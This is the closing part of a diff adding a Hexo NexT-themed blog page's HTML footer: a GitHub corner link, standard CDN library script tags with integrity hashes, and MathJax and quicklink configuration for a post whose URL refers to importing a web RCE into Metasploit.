+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
